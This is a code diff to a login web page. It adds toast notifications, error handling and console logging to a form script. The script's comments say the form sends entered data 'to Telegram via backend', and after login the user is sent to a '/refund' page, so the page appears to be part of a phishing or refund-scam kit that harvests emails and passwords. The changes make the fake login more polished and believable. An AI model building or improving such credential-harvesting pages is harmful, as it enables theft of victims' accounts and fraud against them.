@@ -618,9 +618,55 @@
                 max-width: 500px;
             }
         }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #1a1a2e;
+            color: #ffffff;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            font-weight: 500;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            opacity: 0;
+            transition: all 0.4s ease;
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            max-width: 90%;
+            text-align: center;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast.error {
+            background: #dc2626;
+        }
+
+        .toast.success {
+            background: #16a34a;
+        }
+
+        .toast i {
+            font-size: 1.4rem;
+        }
     </style>
 </head>
 <body>
+
+    <!-- ===== TOAST NOTIFICATION ===== -->
+    <div class="toast" id="toast">
+        <i class="fas fa-exclamation-circle"></i>
+        <span id="toastMessage">Error message</span>
+    </div>
 
     <!-- ===== PAGE WRAPPER ===== -->
     <div class="page-wrapper">
@@ -727,7 +773,7 @@
     </div>
 
     <!-- ============================================
-       JAVASCRIPT - SENDS DATA TO TELEGRAM
+       JAVASCRIPT - IMPROVED ERROR HANDLING
        ============================================ -->
     <script>
         // ============================================
@@ -760,6 +806,30 @@
         });
 
         // ============================================
+        // TOAST NOTIFICATION
+        // ============================================
+        function showToast(message, type = 'error') {
+            const toast = document.getElementById('toast');
+            const toastMessage = document.getElementById('toastMessage');
+            const icon = toast.querySelector('i');
+
+            toastMessage.textContent = message;
+            toast.className = 'toast ' + type;
+            
+            if (type === 'error') {
+                icon.className = 'fas fa-exclamation-circle';
+            } else if (type === 'success') {
+                icon.className = 'fas fa-check-circle';
+            }
+            
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 4000);
+        }
+
+        // ============================================
         // LOGIN FORM - SENDS DATA TO TELEGRAM VIA BACKEND
         // ============================================
         document.addEventListener('DOMContentLoaded', function() {
@@ -776,19 +846,19 @@
 
                 // Validation
                 if (!email || !password) {
-                    alert('Please fill in all fields');
+                    showToast('Please fill in all fields', 'error');
                     return;
                 }
 
                 // Simple email validation
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (!emailRegex.test(email)) {
-                    alert('Please enter a valid email address');
+                    showToast('Please enter a valid email address', 'error');
                     return;
                 }
 
                 if (password.length < 6) {
-                    alert('Password must be at least 6 characters');
+                    showToast('Password must be at least 6 characters', 'error');
                     return;
                 }
 
@@ -797,6 +867,8 @@
                 loginBtn.disabled = true;
 
                 try {
+                    console.log('📤 Sending login request...');
+                    
                     const response = await fetch('/api/login', {
                         method: 'POST',
                         headers: {
@@ -805,19 +877,48 @@
                         body: JSON.stringify({ email, password })
                     });
 
-                    const data = await response.json();
+                    console.log('📥 Response status:', response.status);
+                    console.log('📥 Response headers:', response.headers);
+
+                    // Check if response is OK
+                    if (!response.ok) {
+                        const text = await response.text();
+                        console.error('❌ Server error response:', text);
+                        showToast('Server error. Please try again.', 'error');
+                        loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Log in';
+                        loginBtn.disabled = false;
+                        return;
+                    }
+
+                    // Try to parse JSON
+                    let data;
+                    try {
+                        data = await response.json();
+                    } catch (jsonError) {
+                        console.error('❌ JSON parse error:', jsonError);
+                        const text = await response.text();
+                        console.error('Response text:', text);
+                        showToast('Server returned invalid response. Please try again.', 'error');
+                        loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Log in';
+                        loginBtn.disabled = false;
+                        return;
+                    }
+
+                    console.log('📦 Response data:', data);
 
                     if (data.success) {
-                        // Redirect to refund page
-                        window.location.href = data.redirect || '/refund';
+                        showToast('Login successful! Redirecting...', 'success');
+                        setTimeout(() => {
+                            window.location.href = data.redirect || '/refund';
+                        }, 1000);
                     } else {
-                        alert(data.message || 'Login failed. Please try again.');
+                        showToast(data.message || 'Login failed. Please try again.', 'error');
                         loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Log in';
                         loginBtn.disabled = false;
                     }
                 } catch (error) {
-                    console.error('Login error:', error);
-                    alert('Network error. Please check your connection.');
+                    console.error('❌ Login error:', error);
+                    showToast('Network error. Please check your connection.', 'error');
                     loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Log in';
                     loginBtn.disabled = false;
                 }
